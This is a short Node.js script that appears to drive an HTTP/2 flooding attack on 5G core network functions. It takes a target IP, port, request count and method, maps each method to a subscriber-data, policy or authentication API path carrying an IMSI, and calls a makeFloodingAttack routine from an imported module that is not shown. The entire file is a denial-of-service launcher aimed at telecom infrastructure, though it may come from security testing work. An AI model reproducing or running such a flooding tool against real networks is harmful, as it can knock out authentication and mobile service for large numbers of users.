const http2 = require('http2');
const fs = require('fs');
const Http2Flooding=require('./http2flooding')


function main(){
  const args = process.argv.slice(2);
  if(args.length!=4){
    console.log("Insert ip - port - number of requests - http method");
    process.exit(1);
  }

  const http_methods=['POST','GET','DELETE','PUT'];
  var http_method_path ={
    "GET":"/nudm-sdm/v2/imsi-460020301001001?dataset-names=AM,SMF_SEL",
    "POST":"/nudm-sdm/v2/imsi-460020301001001/sdm-subscriptions",
    "DELETE":"/npcf-am-policy-control/v1/policies/PolAssoId31",
    "PUT":"/nausf-auth/v1/ue-authentications/imsi-460020301001001/5g-aka-confirmation"

  }
  const [ip, port, numberOfRequests ] = args.slice(0,3);
  var method=args[3];
  if(!http_methods.includes(method)){
    console.log("",method);
    console.log("Insert a correct method:POST GET DELETE PUT");
    process.exit(1);
  }
  const http2flooding = new Http2Flooding(ip, port, numberOfRequests);
  const client=http2flooding.connectToServer();
  http2flooding.makeFloodingAttack(client,method,http_method_path[method]);

}

main();